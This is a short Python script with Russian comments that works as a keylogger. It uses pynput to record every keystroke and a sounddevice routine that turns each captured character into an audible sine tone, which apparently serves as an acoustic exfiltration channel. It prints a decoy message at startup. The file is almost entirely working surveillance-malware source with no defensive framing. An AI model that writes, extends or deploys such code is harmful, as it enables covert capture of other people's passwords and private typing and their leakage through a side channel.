#!/usr/bin/env python3
import argparse
import sys
import time
import queue
import threading
import sounddevice as sd
import numpy as np
from pynput.keyboard import Listener

# Просто выводим сообщение
print("hol up!! \n sleepp(5) There you go !!! ")

# Очередь для хранения символов
q = queue.Queue()

# Функция, которая будет записывать клавиши
def logger(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == "Key.ctrl":
        letter = ''
    if letter == "Key.backspace":
        letter = ''
    if letter == "Key.up":
        letter = ''
    if letter == "Key.tab":
        letter = ''
    if letter == "Key.right":
        letter = ''   
    if letter == "Key.down":
        letter = '' 
    if letter == "Key.left":
        letter = ''
    if letter == "Key.enter":
        letter = "\n"
    
    q.put(letter)

# Функция для преобразования текста в аудиосигнал
def encode_audio(message):
    # Преобразуем текст в аудиоформат
    # Для упрощения будем использовать частоту для каждого символа
    sample_rate = 44100  # Частота дискретизации
    duration = 0.5  # Длительность "импульса" для символа
    audio_data = []

    for char in message:
        # Преобразуем символ в числовое значение (например, ASCII)
        frequency = ord(char) * 10  # Примерно настраиваем частоту
        t = np.linspace(0, duration, int(sample_rate * duration), endpoint=False)
        audio_signal = np.sin(2 * np.pi * frequency * t)
        audio_data.extend(audio_signal)
    
    return np.array(audio_data)

# Функция, которая будет передавать аудио данные
def transmit_audio():
    while True:
        try:
            message = q.get()
            if message != '':
                # Преобразуем сообщение в аудиоформат
                audio_signal = encode_audio(message)

                # Передаем аудиофайл (пока просто воспроизводим его)
                sd.play(audio_signal, 44100)
                sd.wait()

                q.task_done()

        except Exception as e:
            print(f"Error: {e}")
            continue

# Главная функция
def main():
    t = threading.Thread(target=transmit_audio)
    t.start()

    # Листенер для захвата нажатых клавиш
    with Listener(on_press=logger) as l:
        l.join()

if __name__ == '__main__':
    main()

